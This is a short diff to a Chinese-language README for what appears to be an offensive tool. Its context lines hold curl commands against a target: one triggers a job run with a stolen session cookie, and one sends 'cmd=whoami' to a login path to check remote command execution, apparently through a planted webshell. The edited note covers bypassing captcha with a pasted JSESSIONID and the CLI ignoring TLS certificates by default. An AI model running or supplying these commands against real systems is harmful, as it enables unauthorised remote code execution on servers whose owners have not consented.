@@ -73,7 +73,7 @@ curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/run -d "jobId=
 curl.exe -s "http://target:8080/login?cmd=whoami"                                               # 验证回显
 ```
 
-注意：开验证码的目标先跑 `--cookie` 模式（浏览器登录后贴 JSESSIONID），或等 CLI 的验证码 OCR 支持。
+注意：开验证码的目标用 `--cookie` 模式（浏览器登录后贴 JSESSIONID）。CLI **默认忽略 TLS 证书**（自签/代理 MITM 均放行）；curl 打 https 目标记得加 `-k`。
 
 ## gzcli 连接
 
